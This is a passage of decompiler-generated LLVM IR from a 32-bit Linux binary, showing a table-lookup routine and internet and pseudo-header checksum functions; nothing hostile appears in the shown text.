245, 246, 247, 248, 249, 250, 259, 260, 251, 252, 253, 254, 255, 256, 257, 258, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 288, 289, 277, 278, 279, 280, 283, 284, 281, 282, 89, 81, 285, 286, 287, 297, 290, 291, 292, 293, 294, 295, 296, 298, 299, 300 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 15, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 33, 7, 26, 27, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 30, 31, 32, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 97, 98, 99, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 173, 174, 175, 176, 177, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 88, 85, 86, 87, 83, 89, 90, 91, 92, 93, 94, 95, 96, 149, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 161, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 162, 163, 164, 165, 166, 167, 168, 170, 169, 29, 171, 172 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 22, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 19, 33, 24, 25, 26, 27, 28, 29, 35, 55, 56, 30, 31, 32, 34, 36, 37, 38, 39, 115, 116, 117, 118, 119, 120, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 49, 52, 53, 54, 104, 105, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29, 30, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 437, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 34, 35, 36, 37, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 101, 103, 104, 106, 105, 94, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 151, 152, 164, 165, 153, 154, 155, 156, 167, 157, 158, 159, 160, 161, 162, 163, 166, 168, 169, 170, 171, 172, 173, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 511, 188, 512, 513, 514, 517, 518, 519, 520, 174, 175, 176, 177, 178, 180, 179, 181, 182, 183, 184, 185, 186, 187, 509, 510, 189, 190, 191, 192, 193, 194, 515, 516, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 236, 237, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 238, 239, 240, 241, 243, 244, 242, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 264, 265, 269, 270, 266, 267, 268, 262, 263, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 409, 410, 414, 411, 412, 413, 415, 416, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 457, 458, 459, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 432, 433, 430, 431, 434, 435, 436, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 485, 452, 453, 454, 455, 456, 486, 487, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 479, 480, 477, 478, 102, 100, 481, 482, 483, 484, 488, 489, 490, 491, 492, 493, 494, 495 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8054394.5 to i32), { 1, 0 }
  uselistorder i32 134562630, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 8, 2, 1, 9, 3, 10, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 6, 2, 3, 7, 5, 4, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a600(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a600:
  %v0_804a600 = load i32, i32* @edi, align 4
  %v0_804a601 = load i32, i32* @esi, align 4
  %v0_804a602 = load i32, i32* @ebx, align 4
  %v4_804a606 = zext i8 %arg1 to i32
  %v2_804a60e = icmp eq i8 %arg1, 0
  %v4_804a618 = urem i32 %arg3, 256
  %v5_804a618 = load i32, i32* @eax, align 4
  %v6_804a618 = and i32 %v5_804a618, -256
  %v7_804a618 = or i32 %v6_804a618, %v4_804a618
  br i1 %v2_804a60e, label %dec_label_pc_804a645, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %dec_label_pc_804a600
  %v1_804a622 = trunc i32 %arg3 to i8
  %v3_804a626 = add i32 %arg2, 4
  %v4_804a626 = inttoptr i32 %v3_804a626 to i8*
  %v5_804a626 = load i8, i8* %v4_804a626, align 1
  %v16_804a626 = icmp eq i8 %v1_804a622, %v5_804a626
  br i1 %v16_804a626, label %dec_label_pc_804a64c, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a622
  br label %dec_label_pc_804a640

dec_label_pc_804a632:                             ; preds = %dec_label_pc_804a640
  %v1_804a632 = add i32 %v0_804a635.in, 12
  %v2_804a632 = inttoptr i32 %v1_804a632 to i8*
  %v3_804a632 = load i8, i8* %v2_804a632, align 1
  %v4_804a632 = zext i8 %v3_804a632 to i32
  %v6_804a632 = and i32 %v5_804a632, -256
  %v7_804a632 = or i32 %v4_804a632, %v6_804a632
  %v16_804a63a = icmp eq i8 %v1_804a622, %v3_804a632
  br i1 %v16_804a63a, label %dec_label_pc_804a64c, label %dec_label_pc_804a640

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a62b
  %v5_804a632 = phi i32 [ %v7_804a632, %dec_label_pc_804a632 ], [ %v7_804a618, %dec_label_pc_804a62b ]
  %v0_804a635.in = phi i32 [ %v0_804a635, %dec_label_pc_804a632 ], [ %arg2, %dec_label_pc_804a62b ]
  %v0_804a640 = phi i32 [ %v1_804a640, %dec_label_pc_804a632 ], [ 0, %dec_label_pc_804a62b ]
  %v0_804a635 = add i32 %v0_804a635.in, 8
  %v1_804a640 = add i32 %v0_804a640, 1
  store i32 %v1_804a640, i32* @ecx, align 4
  %v12_804a641 = icmp eq i32 %v4_804a606, %v1_804a640
  %v1_804a643 = icmp eq i1 %v12_804a641, false
  br i1 %v1_804a643, label %dec_label_pc_804a632, label %dec_label_pc_804a645

dec_label_pc_804a645:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a64c, %dec_label_pc_804a600
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a622
  %v0_804a64c = phi i32 [ %arg2, %dec_label_pc_804a622 ], [ %v0_804a635, %dec_label_pc_804a632 ]
  %v1_804a64c = inttoptr i32 %v0_804a64c to i32*
  %v2_804a64c = load i32, i32* %v1_804a64c, align 4
  %sext = mul i32 %v2_804a64c, 16777216
  %v2_804a64e = icmp eq i32 %sext, 0
  br i1 %v2_804a64e, label %dec_label_pc_804a645, label %dec_label_pc_804a652

dec_label_pc_804a652:                             ; preds = %dec_label_pc_804a64c
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  %v2_804a662 = sdiv i32 %sext, 16777216
  %v3_804a662 = inttoptr i32 %v2_804a662 to i8*
  %v4_804a662 = call i32 @function_80515e0(i8* %v3_804a662, i32 10)
  ret i32 %v4_804a662

; uselistorder directives
  uselistorder i32 %v1_804a640, { 0, 2, 1 }
  uselistorder i32 %v0_804a635.in, { 1, 0 }
  uselistorder i32 %v0_804a602, { 1, 0 }
  uselistorder i32 %v0_804a601, { 1, 0 }
  uselistorder i32 %v0_804a600, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a645, { 1, 0, 2 }
}

define i32 @function_804d4b0() local_unnamed_addr {
dec_label_pc_804d4b0:
  %tmp = call i16* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804d4b7 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804d4d5, label %dec_label_pc_804d4c0

dec_label_pc_804d4c0:                             ; preds = %dec_label_pc_804d4b0, %dec_label_pc_804d4c0
  %v0_804d4ce = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4c0 ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4c3 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4c0 ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v0_804d4cb = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4c0 ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v1_804d4c0 = inttoptr i32 %v0_804d4cb to i16*
  %v2_804d4c0 = load i16, i16* %v1_804d4c0, align 2
  %v3_804d4c0 = zext i16 %v2_804d4c0 to i32
  %v1_804d4c3 = add i32 %v0_804d4c3, -2
  %v1_804d4cb = add i32 %v0_804d4cb, 2
  %v2_804d4ce = add i32 %v3_804d4c0, %v0_804d4ce
  %v5_804d4d0 = icmp eq i32 %v1_804d4c3, 0
  %v9_804d4d0 = icmp eq i32 %v0_804d4c3, 3
  %v2_804d4d3 = or i1 %v9_804d4d0, %v5_804d4d0
  br i1 %v2_804d4d3, label %dec_label_pc_804d4d5.loopexit, label %dec_label_pc_804d4c0

dec_label_pc_804d4d5.loopexit:                    ; preds = %dec_label_pc_804d4c0
  br label %dec_label_pc_804d4d5

dec_label_pc_804d4d5:                             ; preds = %dec_label_pc_804d4d5.loopexit, %dec_label_pc_804d4b0
  %v0_804d4db = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4d5.loopexit ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4d8 = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4d5.loopexit ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v0_804d4d5 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4d5.loopexit ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v8_804d4d5 = icmp eq i32 %v0_804d4d5, 1
  %v1_804d4d6 = icmp eq i1 %v8_804d4d5, false
  br i1 %v1_804d4d6, label %dec_label_pc_804d4dd, label %dec_label_pc_804d4d8

dec_label_pc_804d4d8:                             ; preds = %dec_label_pc_804d4d5
  %v1_804d4d8 = inttoptr i32 %v0_804d4d8 to i8*
  %v2_804d4d8 = load i8, i8* %v1_804d4d8, align 1
  %v3_804d4d8 = sext i8 %v2_804d4d8 to i32
  %v2_804d4db = add i32 %v3_804d4d8, %v0_804d4db
  br label %dec_label_pc_804d4dd

dec_label_pc_804d4dd:                             ; preds = %dec_label_pc_804d4d5, %dec_label_pc_804d4d8
  %v0_804d4dd = phi i32 [ %v0_804d4db, %dec_label_pc_804d4d5 ], [ %v2_804d4db, %dec_label_pc_804d4d8 ]
  %v1_804d4df = urem i32 %v0_804d4dd, 65536
  %v2_804d4e2 = udiv i32 %v0_804d4dd, 65536
  %v2_804d4e6 = add nuw nsw i32 %v1_804d4df, %v2_804d4e2
  %v2_804d4ea = udiv i32 %v2_804d4e6, 65536
  %v2_804d4ed = add nuw nsw i32 %v2_804d4ea, %v2_804d4e6
  %v1_804d4ef = urem i32 %v2_804d4ed, 65536
  %v1_804d4f2 = xor i32 %v1_804d4ef, 65535
  ret i32 %v1_804d4f2

; uselistorder directives
  uselistorder i32 %v2_804d4e6, { 1, 0 }
  uselistorder i32 %v0_804d4db, { 1, 0 }
  uselistorder i32 %v1_804d4c3, { 0, 2, 1 }
  uselistorder i32 %v4_804d4b7, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d4dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d4c0, { 1, 0 }
}

define i32 @function_804d500() local_unnamed_addr {
dec_label_pc_804d500:
  %tmp14 = call i16* @__decompiler_undefined_function_4()
  %tmp15 = call i16 @__decompiler_undefined_function_1()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804d515 = ptrtoint i16* %tmp14 to i32
  %v1_804d51e = add i32 %tmp17, 12
  %v2_804d51e = inttoptr i32 %v1_804d51e to i32*
  %v3_804d51e = load i32, i32* %v2_804d51e, align 4
  %v1_804d521 = add i32 %tmp17, 16
  %v2_804d521 = inttoptr i32 %v1_804d521 to i32*
  %v3_804d521 = load i32, i32* %v2_804d521, align 4
  %v7_804d527 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804d527, label %dec_label_pc_804d530, label %dec_label_pc_804d545

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d500, %dec_label_pc_804d530
  %v0_804d53e = phi i32 [ %v2_804d53e, %dec_label_pc_804d530 ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d533 = phi i32 [ %v1_804d533, %dec_label_pc_804d530 ], [ %tmp16, %dec_label_pc_804d500 ]
  %v0_804d53b = phi i32 [ %v1_804d53b, %dec_label_pc_804d530 ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v1_804d530 = inttoptr i32 %v0_804d53b to i16*
  %v2_804d530 = load i16, i16* %v1_804d530, align 2
  %v3_804d530 = zext i16 %v2_804d530 to i32
  %v1_804d533 = add i32 %v0_804d533, -2
  %v1_804d53b = add i32 %v0_804d53b, 2
  %v2_804d53e = add i32 %v3_804d530, %v0_804d53e
  %v1_804d540 = add i32 %v0_804d533, -3
  %v6_804d540 = sub i32 2, %v0_804d533
  %v7_804d540 = and i32 %v1_804d533, %v6_804d540
  %v8_804d540 = icmp slt i32 %v7_804d540, 0
  %v9_804d540 = icmp eq i32 %v1_804d540, 0
  %v10_804d540 = icmp slt i32 %v1_804d540, 0
  %v3_804d543 = icmp eq i1 %v10_804d540, %v8_804d540
  %v4_804d543 = icmp eq i1 %v9_804d540, false
  %v5_804d543 = and i1 %v4_804d543, %v3_804d543
  br i1 %v5_804d543, label %dec_label_pc_804d530, label %dec_label_pc_804d545.loopexit

dec_label_pc_804d545.loopexit:                    ; preds = %dec_label_pc_804d530
  br label %dec_label_pc_804d545

dec_label_pc_804d545:                             ; preds = %dec_label_pc_804d545.loopexit, %dec_label_pc_804d500
  %v0_804d5b0 = phi i32 [ %v2_804d53e, %dec_label_pc_804d545.loopexit ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d5ae = phi i32 [ %v1_804d53b, %dec_label_pc_804d545.loopexit ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v0_804d545 = phi i32 [ %v1_804d533, %dec_label_pc_804d545.loopexit ], [ %tmp16, %dec_label_pc_804d500 ]
  %v8_804d545 = icmp eq i32 %v0_804d545, 1
  br i1 %v8_804d545, label %dec_label_pc_804d5ac, label %dec_label_pc_804d548

dec_label_pc_804d548:                             ; preds = %dec_label_pc_804d545, %dec_label_pc_804d5ac
  %v0_804d556 = phi i32 [ %v0_804d5b0, %dec_label_pc_804d545 ], [ %v2_804d5b0, %dec_label_pc_804d5ac ]
  %v2_804d54c = udiv i32 %v3_804d521, 65536
  %v1_804d54f = add i32 %tmp17, 9
  %v2_804d54f = inttoptr i32 %v1_804d54f to i8*
  %v3_804d54f = load i8, i8* %v2_804d54f, align 1
  %v1_804d552 = zext i8 %v3_804d54f to i16
  %v2_804d552 = call i16 @llvm.bswap.i16(i16 %v1_804d552)
  %v3_804d552 = zext i16 %v2_804d552 to i32
  %v2_804d556 = add i32 %v0_804d556, %v2_804d54c
  %v2_804d55e = add i32 %v2_804d556, %v3_804d552
  %v1_804d564 = urem i32 %v3_804d51e, 65536
  %v2_804d56a = udiv i32 %v3_804d51e, 65536
  %v1_804d571 = urem i32 %v3_804d521, 65536
  %v4_804d579 = zext i16 %tmp15 to i32
  %v2_804d56d = add nuw nsw i32 %v2_804d56a, %v4_804d579
  %v2_804d577 = add nuw nsw i32 %v2_804d56d, %v1_804d564
  %v2_804d584 = add nuw nsw i32 %v2_804d577, %v1_804d571
  %v2_804d586 = add i32 %v2_804d584, %v2_804d55e
  %tmp = icmp ult i32 %v2_804d586, 65536
  br i1 %tmp, label %dec_label_pc_804d59e, label %dec_label_pc_804d590

dec_label_pc_804d590:                             ; preds = %dec_label_pc_804d548, %dec_label_pc_804d590
  %v2_804d5953 = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994.in = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994 = udiv i32 %v2_804d5994.in, 65536
  %v1_804d590 = urem i32 %v2_804d5953, 65536
  %v2_804d595 = add nuw nsw i32 %v1_804d590, %v2_804d5994
  %tmp25 = icmp ult i32 %v2_804d595, 65536
  %v1_804d59c = icmp eq i1 %tmp25, false
  br i1 %v1_804d59c, label %dec_label_pc_804d590, label %dec_label_pc_804d59e.loopexit

dec_label_pc_804d59e.loopexit:                    ; preds = %dec_label_pc_804d590
  br label %dec_label_pc_804d59e

dec_label_pc_804d59e:                             ; preds = %dec_label_pc_804d59e.loopexit, %dec_label_pc_804d548
  %v0_804d59e = phi i32 [ %v2_804d595, %dec_label_pc_804d59e.loopexit ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v1_804d59e = urem i32 %v0_804d59e, 65536
  %v1_804d5a2 = xor i32 %v1_804d59e, 65535
  ret i32 %v1_804d5a2

dec_label_pc_804d5ac:                             ; preds = %dec_label_pc_804d545
  %v1_804d5ae = inttoptr i32 %v0_804d5ae to i8*
  %v2_804d5ae = load i8, i8* %v1_804d5ae, align 1
  %v3_804d5ae = zext i8 %v2_804d5ae to i32
  %v2_804d5b0 = add i32 %v3_804d5ae, %v0_804d5b0
  br label %dec_label_pc_804d548

; uselistorder directives
  uselistorder i32 %v2_804d595, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804d586, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804d540, { 1, 0 }
  uselistorder i32 %v1_804d533, { 0, 2, 1 }
  uselistorder i32 %v3_804d521, { 1, 0 }
  uselistorder i32 %v4_804d515, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d590, { 1, 0 }
  uselistorder label %dec_label_pc_804d548, { 1, 0 }
  uselistorder label %dec_label_pc_804d530, { 1, 0 }
}

define i32 @function_804d5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d5e0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
